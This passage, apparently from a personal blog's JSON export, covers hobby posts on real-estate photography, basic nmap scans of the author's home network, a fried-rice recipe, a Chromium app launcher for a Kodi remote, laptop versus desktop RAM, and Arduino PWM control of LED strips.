emailed the position and was more than\npleased to receive a very nicely paid assignment. The work was thoroughly\nenjoyable, and I have had the pleasure of doing four contracts now for this same\ncompany (as of February 2017). I simply wanted to take this opportunity to\nshowcase a few of my favorite photos from my time shooting the properties they\nrequested I shoot.\n\nA few kind words they offered me in response to one of these assignments:\n\nThe photos were of good quality, with lots of angles to choose from even for the\n‘no access’ properties. Good framing skills, consistent white balance.\nGreat job! 🙂\n\n![](https://madscientists.co/wp-content/uploads/2017/09/DSC_3190-300x154.jpg)\n![](https://madscientists.co/wp-content/uploads/2017/09/4755-300x203.jpg)\n![](https://madscientists.co/wp-content/uploads/2017/09/DSC_2818-300x200.jpg)\n![](https://madscientists.co/wp-content/uploads/2017/09/DSC_2912-203x300.jpg)\n![](https://madscientists.co/wp-content/uploads/2017/09/4492-300x203.jpg)\n![](https://madscientists.co/wp-content/uploads/2017/09/DSC_2824-300x216.jpg)\n![](https://madscientists.co/wp-content/uploads/2017/09/4363-300x199.jpg)\n![](https://madscientists.co/wp-content/uploads/2017/09/DSC_2349-300x160.jpg)\n![](https://madscientists.co/wp-content/uploads/2017/09/DSC_1937-300x223.jpg)\n![](https://madscientists.co/wp-content/uploads/2017/09/DSC_2462-238x300.jpg)\n![](https://madscientists.co/wp-content/uploads/2017/09/DSC_3040-300x200.jpg)\n![](https://madscientists.co/wp-content/uploads/2017/09/DSC_2741-300x173.jpg)\n![](https://madscientists.co/wp-content/uploads/2017/09/DSC_2699-300x200.jpg)\n![](https://madscientists.co/wp-content/uploads/2017/09/4249-1024x753-300x221.jpg)\n![](https://madscientists.co/wp-content/uploads/2017/09/4213-1-300x200.jpg)\n![](https://madscientists.co/wp-content/uploads/2017/09/4249-300x221.jpg)","feature_image":"https://madscientists.co/wp-content/uploads/2017/09/DSC_3040-1024x683.jpg","featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-04-28T00:00:54.000Z","created_by":"1","updated_at":"2017-09-12T05:03:30.000Z","updated_by":"1","published_at":"2017-04-28T00:00:54.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332780","uuid":"1fa3dc06-9962-402c-b1b7-57e0d2d5a4ff","title":"nmap is pretty great","slug":"nmap-is-pretty-great","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nI just wanted to note how useful a few simple nmap commands are. The one I use the most is just the command itself.\\n\\nnmap 192.168.1.* or nmap 192.168.1.1/24\\n\\nScans my local IP range on the most common 1000 ports. Usually that’s all I need, and it takes about 5-6 seconds to run. Those two commands are functionally the same – 192.168.1.* is a wildcard for all values between 192.168.1.1 and 192.168.1.256. The other one uses the [subnet](https://en.wikipedia.org/wiki/Subnetwork) mask to tell it to scan all of the 256 IPs in the last block instead of just 192.168.1.1. The notation of 192.168.1.1/24 actually means 192.168.1.1 with a subnet mask of 255.255.255.0.\\n\\nAlso, if you don’t know what port some program is supposed to be listening on (like I tried last night after installing a web interface to my KODI install on my TV), you can scan every single port, or a range of ports with the -p option, like this –\\n\\nnmap -p- television nmap -p 22,80,443 192.168.1.150 nmap -p 1-10000 localhost\\n\\nSo the first example above is the command I used last night – it scanned every single UDP and TCP port on the IP address that I have mapped (with /etc/hosts) to *television*. It took 2120.28 seconds, which is around 35 minutes. Yeouch. Probably not worth it most of the time, but it could come in handy when checking to make sure your home or office network doesn’t have any public-facing ports. In the my case, it would’ve been (and was) much faster than 35 minutes to go into the settings in Kodi and find that the web interface is not enabled by default, and a clear option for the port.\\n\\nAlso, a side note to anyone running Kodi – don’t be dumb. Make sure that web interface is firewalled behind a NAT router.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>I just wanted to note how useful a few simple nmap commands are. The one I use the most is just the command itself.</p>\n<p>nmap 192.168.1.* or nmap 192.168.1.1/24</p>\n<p>Scans my local IP range on the most common 1000 ports. Usually that’s all I need, and it takes about 5-6 seconds to run. Those two commands are functionally the same – 192.168.1.* is a wildcard for all values between 192.168.1.1 and 192.168.1.256. The other one uses the <a href=\"https://en.wikipedia.org/wiki/Subnetwork\">subnet</a> mask to tell it to scan all of the 256 IPs in the last block instead of just 192.168.1.1. The notation of 192.168.1.1/24 actually means 192.168.1.1 with a subnet mask of 255.255.255.0.</p>\n<p>Also, if you don’t know what port some program is supposed to be listening on (like I tried last night after installing a web interface to my KODI install on my TV), you can scan every single port, or a range of ports with the -p option, like this –</p>\n<p>nmap -p- television nmap -p 22,80,443 192.168.1.150 nmap -p 1-10000 localhost</p>\n<p>So the first example above is the command I used last night – it scanned every single UDP and TCP port on the IP address that I have mapped (with /etc/hosts) to <em>television</em>. It took 2120.28 seconds, which is around 35 minutes. Yeouch. Probably not worth it most of the time, but it could come in handy when checking to make sure your home or office network doesn’t have any public-facing ports. In the my case, it would’ve been (and was) much faster than 35 minutes to go into the settings in Kodi and find that the web interface is not enabled by default, and a clear option for the port.</p>\n<p>Also, a side note to anyone running Kodi – don’t be dumb. Make sure that web interface is firewalled behind a NAT router.</p>\n</div>","amp":"317","plaintext":"I just wanted to note how useful a few simple nmap commands are. The one I use\nthe most is just the command itself.\n\nnmap 192.168.1.* or nmap 192.168.1.1/24\n\nScans my local IP range on the most common 1000 ports. Usually that’s all I\nneed, and it takes about 5-6 seconds to run. Those two commands are functionally\nthe same – 192.168.1.* is a wildcard for all values between 192.168.1.1 and\n192.168.1.256. The other one uses the subnet\n[https://en.wikipedia.org/wiki/Subnetwork]  mask to tell it to scan all of the\n256 IPs in the last block instead of just 192.168.1.1. The notation of\n192.168.1.1/24 actually means 192.168.1.1 with a subnet mask of 255.255.255.0.\n\nAlso, if you don’t know what port some program is supposed to be listening on\n(like I tried last night after installing a web interface to my KODI install on\nmy TV), you can scan every single port, or a range of ports with the -p option,\nlike this –\n\nnmap -p- television nmap -p 22,80,443 192.168.1.150 nmap -p 1-10000 localhost\n\nSo the first example above is the command I used last night – it scanned every\nsingle UDP and TCP port on the IP address that I have mapped (with /etc/hosts)\ntotelevision. It took 2120.28 seconds, which is around 35 minutes. Yeouch.\nProbably not worth it most of the time, but it could come in handy when checking\nto make sure your home or office network doesn’t have any public-facing ports.\nIn the my case, it would’ve been (and was) much faster than 35 minutes to go\ninto the settings in Kodi and find that the web interface is not enabled by\ndefault, and a clear option for the port.\n\nAlso, a side note to anyone running Kodi – don’t be dumb. Make sure that web\ninterface is firewalled behind a NAT router.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-05-26T18:53:05.000Z","created_by":"1","updated_at":"2017-05-26T18:53:05.000Z","updated_by":"1","published_at":"2017-05-26T18:53:05.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332781","uuid":"30a4a05b-31d4-4cfd-9c2b-7f652d1091fc","title":"Soup-fried Shrimp-Rice","slug":"soup-fried-shrimp-rice","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nThis is a tasty, quick, and easy recipe I came up with for lunch today. This recipe is for an individual portion, simply multiply the quantities by the number of people you’re serving. I made it as a double recipe today for me and Owen. Also, I apologize in advance for the casual nature of my recipes. I don’t use precise measurements or time values unless one of my ingredients requires it.\\n\\n#### Ingredients –\\n\\n- ½ cup chicken stock\\n- ½ cup water\\n- Some shrimps\\n- 1 cup of minute rice\\n- One egg, scrambled.\\n- ~1.5-2.5 tablespoons of oil\\n- Soy sauce to taste.\\n- Your favorite seasonings or frozen vegetables if you would like\\n\\nFirst, boil the shrimp in the stock and water mixture. Wait until they float and move around freely, stirring occasionally, and pull them out, either by straining them or with a fork. Set the shrimp aside, and add the rice and vegetables if you are using them to the still-boiling water/stock mixture. Cover and remove it from the heat, just like you would normally when making instant rice. Tail the shrimp and fry the scrambled egg, stirring the rice occasionally. Once the rice is nice and fluffy, add about a half to two-thirds of the oil (a tablespoon or so) to the pan, crank the heat to as high as it will go, wait until the pan is hot (If you’re using a copper, aluminum, or a wok, this won’t be long, but if you’re using an insulating pan like a cast iron skillet it will take a few minutes), and put everything else in, stirring constantly, and cook for a surprisingly long time. Seriously I had this stuff on high heat for a good 10 minutes at least. Add the soy sauce as you’re stirring and make sure you get it spread around evenly. It takes a surprising amount of soy sauce (an ingredient I use extremely sparingly if at all under most circumstances) to get that fried rice flavor. Add some garlic or whatever seasonings you like while you’re stirring, and once the rice is a little browned and crispy, or when you get too hungry to wait any longer, it’s ready to serve.\\n\\nWhen I made this most recently I didn’t include vegetables but I intend to next time and will update the recipe if anything different needs done with the veggies.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>This is a tasty, quick, and easy recipe I came up with for lunch today. This recipe is for an individual portion, simply multiply the quantities by the number of people you’re serving. I made it as a double recipe today for me and Owen. Also, I apologize in advance for the casual nature of my recipes. I don’t use precise measurements or time values unless one of my ingredients requires it.</p>\n<h4 id=\"ingredients\">Ingredients –</h4>\n<ul>\n<li>½ cup chicken stock</li>\n<li>½ cup water</li>\n<li>Some shrimps</li>\n<li>1 cup of minute rice</li>\n<li>One egg, scrambled.</li>\n<li>~1.5-2.5 tablespoons of oil</li>\n<li>Soy sauce to taste.</li>\n<li>Your favorite seasonings or frozen vegetables if you would like</li>\n</ul>\n<p>First, boil the shrimp in the stock and water mixture. Wait until they float and move around freely, stirring occasionally, and pull them out, either by straining them or with a fork. Set the shrimp aside, and add the rice and vegetables if you are using them to the still-boiling water/stock mixture. Cover and remove it from the heat, just like you would normally when making instant rice. Tail the shrimp and fry the scrambled egg, stirring the rice occasionally. Once the rice is nice and fluffy, add about a half to two-thirds of the oil (a tablespoon or so) to the pan, crank the heat to as high as it will go, wait until the pan is hot (If you’re using a copper, aluminum, or a wok, this won’t be long, but if you’re using an insulating pan like a cast iron skillet it will take a few minutes), and put everything else in, stirring constantly, and cook for a surprisingly long time. Seriously I had this stuff on high heat for a good 10 minutes at least. Add the soy sauce as you’re stirring and make sure you get it spread around evenly. It takes a surprising amount of soy sauce (an ingredient I use extremely sparingly if at all under most circumstances) to get that fried rice flavor. Add some garlic or whatever seasonings you like while you’re stirring, and once the rice is a little browned and crispy, or when you get too hungry to wait any longer, it’s ready to serve.</p>\n<p>When I made this most recently I didn’t include vegetables but I intend to next time and will update the recipe if anything different needs done with the veggies.</p>\n</div>","amp":"322","plaintext":"This is a tasty, quick, and easy recipe I came up with for lunch today. This\nrecipe is for an individual portion, simply multiply the quantities by the\nnumber of people you’re serving. I made it as a double recipe today for me and\nOwen. Also, I apologize in advance for the casual nature of my recipes. I don’t\nuse precise measurements or time values unless one of my ingredients requires\nit.\n\nIngredients –\n * ½ cup chicken stock\n * ½ cup water\n * Some shrimps\n * 1 cup of minute rice\n * One egg, scrambled.\n * ~1.5-2.5 tablespoons of oil\n * Soy sauce to taste.\n * Your favorite seasonings or frozen vegetables if you would like\n\nFirst, boil the shrimp in the stock and water mixture. Wait until they float and\nmove around freely, stirring occasionally, and pull them out, either by\nstraining them or with a fork. Set the shrimp aside, and add the rice and\nvegetables if you are using them to the still-boiling water/stock mixture. Cover\nand remove it from the heat, just like you would normally when making instant\nrice. Tail the shrimp and fry the scrambled egg, stirring the rice occasionally.\nOnce the rice is nice and fluffy, add about a half to two-thirds of the oil (a\ntablespoon or so) to the pan, crank the heat to as high as it will go, wait\nuntil the pan is hot (If you’re using a copper, aluminum, or a wok, this won’t\nbe long, but if you’re using an insulating pan like a cast iron skillet it will\ntake a few minutes), and put everything else in, stirring constantly, and cook\nfor a surprisingly long time. Seriously I had this stuff on high heat for a good\n10 minutes at least. Add the soy sauce as you’re stirring and make sure you get\nit spread around evenly. It takes a surprising amount of soy sauce (an\ningredient I use extremely sparingly if at all under most circumstances) to get\nthat fried rice flavor. Add some garlic or whatever seasonings you like while\nyou’re stirring, and once the rice is a little browned and crispy, or when you\nget too hungry to wait any longer, it’s ready to serve.\n\nWhen I made this most recently I didn’t include vegetables but I intend to next\ntime and will update the recipe if anything different needs done with the\nveggies.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-05-30T20:34:56.000Z","created_by":"1","updated_at":"2017-05-30T20:34:56.000Z","updated_by":"1","published_at":"2017-05-30T20:34:56.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332782","uuid":"062dc6f4-b0cf-41a6-89cb-6359a1347a6f","title":"Adding a custom Chrome URL as a standard Linux application.","slug":"adding-a-custom-chrome-url-as-a-standard-linux-application","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nI have a TV with a Raspberry Pi permanently running on an HDMI port running Kodi. Kodi/XBMC has a ton of features and about as many glitches and unintuitive design elements. I put up with that because the features are so cool. For example, just by going to the settings menu, you can enable a web interface that is really quite nice and easy to use. However, you have to navigate to an IP address (or a local domain set in your /etc/hosts file), with a port number (Kodi can’t make use of ports below 1024 because it’s not a root process – as it should be!) and I like to go straight to the remote control interface with the /#remote URL. Thankfully, I’m running Chromium on Linux so this isn’t even difficult!\\n\\nIf you look in ‘man chromium’ you’ll find that the chromium command comes with a ‘–app=…’ option. This will open any webpage in the webapp style interface that Chrome uses for it’s Chrome Apps – with no tab bar, toolbar, or anything else. So I can start the Kodi remote with the command\\n\\nchromium --app=http://television:8080/#remote\\n\\nHowever, that’s not really a very convenient command to run. I mean, the only difference between that and just opening up a new chrome window and navigating to the address is that the remote. Can’t we make it any easier? Of course we can, because Linux is awesome! Personally, I run i3 desktop environment, so for me, I just hit the ‘search’ button on my keyboard and type in “kodi” and hit enter, and up comes a nice Kodi remote application. The key to this is really simple- you add a .desktop file to either $HOME/.local/share/applications/ or /usr/share/applications. I formatted my desktop file like so, because dmenu (the application launching menu of i3) doesn’t support categories – you would want to add the appropriate ‘Category=value’ entry to yours if you run XFCE, LXDE, KDE, Gnome, or Unity.\\n\\n[Desktop Entry] Encoding=UTF-8 Version=1 Type=Application Terminal=false Name=Kodi Remote Exec=/usr/bin/chromium --app=http://television:8080/#remote\\n\\nNote that my Kodi instance is mapped to the ‘television’ domain with the /etc/hosts/ file.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>I have a TV with a Raspberry Pi permanently running on an HDMI port running Kodi. Kodi/XBMC has a ton of features and about as many glitches and unintuitive design elements. I put up with that because the features are so cool. For example, just by going to the settings menu, you can enable a web interface that is really quite nice and easy to use. However, you have to navigate to an IP address (or a local domain set in your /etc/hosts file), with a port number (Kodi can’t make use of ports below 1024 because it’s not a root process – as it should be!) and I like to go straight to the remote control interface with the /#remote URL. Thankfully, I’m running Chromium on Linux so this isn’t even difficult!</p>\n<p>If you look in ‘man chromium’ you’ll find that the chromium command comes with a ‘–app=…’ option. This will open any webpage in the webapp style interface that Chrome uses for it’s Chrome Apps – with no tab bar, toolbar, or anything else. So I can start the Kodi remote with the command</p>\n<p>chromium --app=http://television:8080/#remote</p>\n<p>However, that’s not really a very convenient command to run. I mean, the only difference between that and just opening up a new chrome window and navigating to the address is that the remote. Can’t we make it any easier? Of course we can, because Linux is awesome! Personally, I run i3 desktop environment, so for me, I just hit the ‘search’ button on my keyboard and type in “kodi” and hit enter, and up comes a nice Kodi remote application. The key to this is really simple- you add a .desktop file to either $HOME/.local/share/applications/ or /usr/share/applications. I formatted my desktop file like so, because dmenu (the application launching menu of i3) doesn’t support categories – you would want to add the appropriate ‘Category=value’ entry to yours if you run XFCE, LXDE, KDE, Gnome, or Unity.</p>\n<p>[Desktop Entry] Encoding=UTF-8 Version=1 Type=Application Terminal=false Name=Kodi Remote Exec=/usr/bin/chromium --app=http://television:8080/#remote</p>\n<p>Note that my Kodi instance is mapped to the ‘television’ domain with the /etc/hosts/ file.</p>\n</div>","amp":"324","plaintext":"I have a TV with a Raspberry Pi permanently running on an HDMI port running\nKodi. Kodi/XBMC has a ton of features and about as many glitches and unintuitive\ndesign elements. I put up with that because the features are so cool. For\nexample, just by going to the settings menu, you can enable a web interface that\nis really quite nice and easy to use. However, you have to navigate to an IP\naddress (or a local domain set in your /etc/hosts file), with a port number\n(Kodi can’t make use of ports below 1024 because it’s not a root process – as it\nshould be!) and I like to go straight to the remote control interface with the\n/#remote URL. Thankfully, I’m running Chromium on Linux so this isn’t even\ndifficult!\n\nIf you look in ‘man chromium’ you’ll find that the chromium command comes with a\n‘–app=…’ option. This will open any webpage in the webapp style interface that\nChrome uses for it’s Chrome Apps – with no tab bar, toolbar, or anything else.\nSo I can start the Kodi remote with the command\n\nchromium --app=http://television:8080/#remote\n\nHowever, that’s not really a very convenient command to run. I mean, the only\ndifference between that and just opening up a new chrome window and navigating\nto the address is that the remote. Can’t we make it any easier? Of course we\ncan, because Linux is awesome! Personally, I run i3 desktop environment, so for\nme, I just hit the ‘search’ button on my keyboard and type in “kodi” and hit\nenter, and up comes a nice Kodi remote application. The key to this is really\nsimple- you add a .desktop file to either $HOME/.local/share/applications/ or\n/usr/share/applications. I formatted my desktop file like so, because dmenu (the\napplication launching menu of i3) doesn’t support categories – you would want to\nadd the appropriate ‘Category=value’ entry to yours if you run XFCE, LXDE, KDE,\nGnome, or Unity.\n\n[Desktop Entry] Encoding=UTF-8 Version=1 Type=Application Terminal=false\nName=Kodi Remote Exec=/usr/bin/chromium --app=http://television:8080/#remote\n\nNote that my Kodi instance is mapped to the ‘television’ domain with the\n/etc/hosts/ file.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-05-30T20:59:31.000Z","created_by":"1","updated_at":"2017-12-03T15:51:40.000Z","updated_by":"1","published_at":"2017-05-30T20:59:31.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332783","uuid":"db29a1be-32f4-4f72-956f-219fe87486b6","title":"Laptop vs. Desktop RAM","slug":"laptop-vs-desktop-ram","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nA lot of people, when looking for RAM to upgrade their computer, find the right speed and model, then say “hey, is this right for my computer?”\\n\\nAnd I say, “no, that’s laptop RAM.”\\n\\n“Well, won’t it fit?”\\n\\nI say “no, it’s a different size.”\\n\\nThis is desktop RAM\\n\\n<figure class=\\\"wp-caption aligncenter\\\" id=\\\"attachment_336\\\" style=\\\"width: 200px\\\">[![Thanks to Wikimedia for this image of DIMM DDR1-4](https://blog.tams.tech/wp-content/uploads/2017/06/Desktop_DDR_Memory_Comparison.svg_.png)](https://en.wikipedia.org/wiki/DDR3_SDRAM)<figcaption class=\\\"wp-caption-text\\\">DIMM DDR1-4</figcaption></figure>And this is laptop RAM.\\n\\n<figure class=\\\"wp-caption aligncenter\\\" id=\\\"attachment_337\\\" style=\\\"width: 200px\\\">[![Thanks to Wikimedia for this image of SO-DIMM DDR1-3](https://blog.tams.tech/wp-content/uploads/2017/06/200px-Laptop_SODIMM_DDR_Memory_Comparison_V2.svg_.png)](https://en.wikipedia.org/wiki/SO-DIMM)<figcaption class=\\\"wp-caption-text\\\">SO-DIMM DDR1-3 size comparison</figcaption></figure>They function *exactly *the same, except that they are slightly different in size. So… if they’re the same, could one… convert them? Technically, yes, but it’s only really useful in testing environments for a few reasons. One, the adapters would probably cost more than the RAM itself, so it’s immediately not worth it because of that alone, but on top of that you would very likely notice a speed decrease compared to proper DIMM memory, although that could be debated.\\n\\n \\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>A lot of people, when looking for RAM to upgrade their computer, find the right speed and model, then say “hey, is this right for my computer?”</p>\n<p>And I say, “no, that’s laptop RAM.”</p>\n<p>“Well, won’t it fit?”</p>\n<p>I say “no, it’s a different size.”</p>\n<p>This is desktop RAM</p>\n<figure class=\"wp-caption aligncenter\" id=\"attachment_336\" style=\"width: 200px\">[![Thanks to Wikimedia for this image of DIMM DDR1-4](https://blog.tams.tech/wp-content/uploads/2017/06/Desktop_DDR_Memory_Comparison.svg_.png)](https://en.wikipedia.org/wiki/DDR3_SDRAM)<figcaption class=\"wp-caption-text\">DIMM DDR1-4</figcaption></figure>And this is laptop RAM.\n<figure class=\"wp-caption aligncenter\" id=\"attachment_337\" style=\"width: 200px\">[![Thanks to Wikimedia for this image of SO-DIMM DDR1-3](https://blog.tams.tech/wp-content/uploads/2017/06/200px-Laptop_SODIMM_DDR_Memory_Comparison_V2.svg_.png)](https://en.wikipedia.org/wiki/SO-DIMM)<figcaption class=\"wp-caption-text\">SO-DIMM DDR1-3 size comparison</figcaption></figure>They function *exactly *the same, except that they are slightly different in size. So… if they’re the same, could one… convert them? Technically, yes, but it’s only really useful in testing environments for a few reasons. One, the adapters would probably cost more than the RAM itself, so it’s immediately not worth it because of that alone, but on top of that you would very likely notice a speed decrease compared to proper DIMM memory, although that could be debated.\n<p></p>\n</div>","amp":"335","plaintext":"A lot of people, when looking for RAM to upgrade their computer, find the right\nspeed and model, then say “hey, is this right for my computer?”\n\nAnd I say, “no, that’s laptop RAM.”\n\n“Well, won’t it fit?”\n\nI say “no, it’s a different size.”\n\nThis is desktop RAM\n\n[![Thanks to Wikimedia for this image of DIMM\nDDR1-4](https://blog.tams.tech/wp-content/uploads/2017/06/Desktop_DDR_Memory_Comparison.svg_.png)](https://en.wikipedia.org/wiki/DDR3_SDRAM)\nDIMM DDR1-4And this is laptop RAM.[![Thanks to Wikimedia for this image of\nSO-DIMM\nDDR1-3](https://blog.tams.tech/wp-content/uploads/2017/06/200px-Laptop_SODIMM_DDR_Memory_Comparison_V2.svg_.png)](https://en.wikipedia.org/wiki/SO-DIMM)\nSO-DIMM DDR1-3 size comparisonThey function *exactly *the same, except that they\nare slightly different in size. So… if they’re the same, could one… convert\nthem? Technically, yes, but it’s only really useful in testing environments for\na few reasons. One, the adapters would probably cost more than the RAM itself,\nso it’s immediately not worth it because of that alone, but on top of that you\nwould very likely notice a speed decrease compared to proper DIMM memory,\nalthough that could be debated.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-06-10T21:06:57.000Z","created_by":"1","updated_at":"2017-06-10T21:06:57.000Z","updated_by":"1","published_at":"2017-06-10T21:06:57.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332784","uuid":"26dbecf4-1a21-411c-bcbe-f7aea8c66b5f","title":"LED Light Strips","slug":"led-light-strips","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nIf you’ve hung out with me within the past few months, I’ve probably mentioned at some point some [LED](https://en.wikipedia.org/wiki/Light-emitting_diode) light strips. I discovered these while discussing lights I’m working on with some folks on #electronics on the [Freenode](https://en.wikipedia.org/wiki/Freenode) [IRC](https://en.wikipedia.org/wiki/Internet_Relay_Chat). I had been discussing the fact with them that I had no way to reference how bright an LED would be when it got to me – I had no point of reference for various [lumen](https://en.wikipedia.org/wiki/Lumen_(unit)) or [candela](https://en.wikipedia.org/wiki/Candela) values, and I was worried that I would order dozens of individual LEDs, wire them up in a clever circuit, and discover they  weren’t bright enough to serve my purposes. They suggested to me that I look up surface-mounted ([SMD](https://en.wikipedia.org/wiki/Surface-mount_technology)) [LED](https://en.wikipedia.org/wiki/SMD_LED_Module) strips on eBay and the like. Oh man, what I found was a gold mine of possible uses. I got mine on [BangGood](https://www.banggood.com/5M-White-3528-SMD-LED-Strip-Light-Non-Waterproof-12V-DC-300-LED-p-77079.html), although it can be purchased on [eBay](http://www.ebay.com/itm/5M-SMD-3528-5050-5630-3014-300LEDs-RGB-White-LED-Strip-Light-12V-Power-Supply-US-/181435517609) as well. The version I got was white (because who needs color control in a black and white film?), but they do sell [RGB](https://www.banggood.com/5M-RGB-Non-Waterproof-300-LED-SMD-5050-LED-Strip-Light-DC-12V-p-925678.html) versions for just a few bucks more. Actually, this… tutorial? article? whatever, applies better to the RGB version than to the white one, unless like me you want to separately control multiple light sources. More on that later. There are a few key features which make these specific lighting solutions versatile and very useful.\\n\\n- Segmentation every five centimeters, with clear labels at one end and solder pads at both ends. This is also two inches, meaning they are easily used in projects for users who are familiar with metric or English measurements.\\n- Adhesive on the back\\n- Very bright, 3 LEDs per 5cm section.\\n- 12V power supply.\\n\\nHowever, one thing makes it rather inconvenient compared to other LED solutions – it’s not dimmable. I wired the system up directly with a 500Ω [potentiometer](https://en.wikipedia.org/wiki/Potentiometer), and it didn’t react well. At low [impedance](https://en.wikipedia.org/wiki/Electrical_impedance) (if you’re unfamiliar with a potentiometer, picture a volume knob turned all the way up), it would display its usual brightness – there was no more resistance than usual, as the pot was not causing a lot of resistance. However, when I turned the potentiometer’s knob to a higher impedance (again, you can picture a volume knob being turned down – the speakers, or in this case, lights, were recieving less current because the device was *impeding* that current), I was disappointed to see the lights stay at the same brightness part of the way to the high-impedance state, and then suddenly drop to a significantly lower brightness. There is an additional device attached to each 5cm section (aside from the 3 LEDs), which I initially thought to be a simple 150Ω resistor (it has a label 151, and I would be curious to find its actual function). It quickly became clear that that device served some other purpose than protecting the LEDs from excessive current – it regulates it. Alternatively, the LEDs themselves could have regulatory circuitry built in.\\n\\nFortunately, there is a commonly known solution to the problem of needing to *effectively* dim something that can’t be dimmed. This process is known as **P**ulse-**W**idth **M**odulation. [PWM](https://en.wikipedia.org/wiki/Pulse-width_modulation) is when, instead of modulating how much current is going to a circuit by limiting the power getting to it (generally by increasing resistance – [Ohm’s law](https://en.wikipedia.org/wiki/Ohm%27s_law) states that increased resistance proportionally decreases power), a circuit is instead designed to pass the full amount of current to the device which does the work (in this case lights – and I’m just going to refer to them as such for the rest of this), for very brief periods of time. By varying the time during which the LEDs are *off*, which is too brief to actually see, you can effectively reduce overall amount of light reaching our eyes in a given period of time. This works especially well in film, because as long as your pulses are at least a few multiples of your frame rate your camera will not be able to see *any* pulsing. In my case, I expect a frame rate between 60 and 500 frames per second (or, you could think of it as hertz, if you want) and the Arduino Microcontroller I used functions at 16Khz. Even if you assume it switches only once every 10 clock cycles (it does so faster), that’s 1600Hz, which, even at the dimmest level, on the highest frame-rate (at which point the light would be practically invisible anyway), is plenty for these purposes.\\n\\nSo – if the Arduino can do this PWM shit, why are you writing this lengthy article about it? Well, these light strips are powered by 12V at an unspecified amount of current, but the Arduino can only output 5V at 40 milliamperes – a measly 0.02 watts.  So, how do we get the Arduino to control a device which requires 100× the amount of current an Arduino can pass through it, or more? With one of the building blocks of modern computing – the transistor. There are a lot of different types of transistors, but the most common one is the NPN bipolar junction, which just so happens to be exactly what we need. You can get 4 transistors in one chip, I’m going to be ordering the STA412A tomorrow, which will have more than enough capability to amplify the minuscule current from the Arduino into something that can power the whole light strip. According to its [datasheet](http://www.semicon.sanken-ele.co.jp/sk_content/sta412a_ds_en.pdf), pins 1 and 10 are the ground, pins 2, 4, 6, and 8 are going to be our inputs, and we can connect up to four light strips on pins 3, 5, 7, and 9. I wire my prototypes on a solderless breadboard, and then I will use a small solderable breadboard to build the final control module.\\n\\nI have several white light sources I want to control with this, but the ideal thing about using a 4×-chip like this is that then you can use this circuit to control the red blue and green values, giving you 256³ or [16,777,216](https://en.wikipedia.org/wiki/Color_depth#True_color_.2824-bit.29) color values to choose from, all controllable from the Arduino. Using a knob to dim lights that don’t like to be dimmed is just the very base use case for this particular circuit. You could modify the code slightly to accept input from other sources, like an [I2C data line](https://playground.arduino.cc/Main/InterfacingWithHardware#Input) or an [ethernet](http://www.ebay.com/itm/Ethernet-Shield-Lan-W5100-For-Arduino-Board-UNO-R3-ATMega-328-MEGA-1280-2560-/322267901919) connection. There are even [modules](https://smile.amazon.com/Makerfocus-1800MHz-1900MHz-Breadboard-Breakout/dp/B01NCNJOSI/) you can add to Arduino to let it receive text messages over-the-air  (OTA). One thing I plan on doing in the future is converting this same system to run from the Raspberry PI (which [also](https://makezine.com/projects/tutorial-raspberry-pi-gpio-pins-and-python/) has [GPIO](https://en.wikipedia.org/wiki/General-purpose_input/output) pins) and use it to control a backlight behind my TV based on… well I haven’t decided yet. I’d like it to respond to the colors of what was on the screen but I think it would be very difficult to find that information out from the system.\\n\\nAnyway, here’s the code:\\n\\n//constants for the pins const int PIN_OUTPUT_ONE = 3; const int PIN_OUTPUT_TWO = 5; const int PIN_OUTPUT_THREE = 6; const int PIN_OUTPUT_FOUR = 9; const int PIN_INPUT_ONE = A0; const int PIN_INPUT_TWO = A1; const int PIN_INPUT_THREE = A2; const int PIN_INPUT_FOUR = A3; //variables for the input and 